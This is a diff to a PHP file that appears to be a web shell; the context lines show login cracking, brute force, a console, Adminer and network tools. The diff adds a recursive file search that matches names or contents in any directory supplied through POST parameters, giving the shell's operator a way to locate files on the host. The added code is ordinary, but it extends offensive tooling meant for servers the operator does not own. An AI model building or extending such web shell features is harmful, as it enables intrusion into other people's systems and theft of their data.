@@ -513,6 +513,32 @@ function crackFunctionLogin($info){
 	}
 }
 
+function searchString($method, $dir, $string, $ext, &$output = array())
+{
+	if(is_dir($dir)) {
+		$files = scandir($dir);
+		foreach($files as $file) {
+			$path = realpath($dir.DIRECTORY_SEPARATOR.$file);
+			
+			if($file == "." || $file == "..") continue;
+			if(is_dir($path)) searchString($method, $path, $string, $ext, $output);
+				
+			if($ext != "*") {
+				$getExtension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+				if(strtolower($ext) != $getExtension) continue;
+			}
+	
+			if($method == "fsf") {
+				$content = file_get_contents($path);
+				if(strpos($content, $string) !== false) $output[] = str_replace('\\','/',$path);
+			} else {
+				if(strstr($file, $string)) $output[] = str_replace('\\','/',$path);
+			}
+		}
+	}
+	return $output;
+}
+
 function newfile(){
 
 	global $path;
@@ -993,6 +1019,23 @@ function bruteforce()
 
 }
 
+function search(){
+	
+	global $path;
+
+	if(!isset($_POST["method"])) {
+		pages("search", ["Tools", "Search"], array("{{OUTPUT}}", "{{DIR}}"), array("", $path));
+	} else {
+		$method = $_POST["method"];
+		$string = $_POST["string"];
+		$dir = $_POST["dir"];
+		$ext = $_POST["ext"];
+
+		$outputFile = searchString($method, $dir, $string, $ext);
+		pages("search", ["Tools", "Search"], array("{{OUTPUT}}", "{{DIR}}"), array(implode("\n", $outputFile), $path));
+	}
+}
+
 if(isset($_GET["page"]))
 {
 	$page = $_GET["page"];
@@ -1016,6 +1059,7 @@ if(isset($_GET["page"]))
 	if($page == "mdelete") mdelete();
 
 	// Tools
+	if($page == "search") search();
 	if($page == "console") console();
 	if($page == "adminer") adminer();
 	if($page == "network") network();
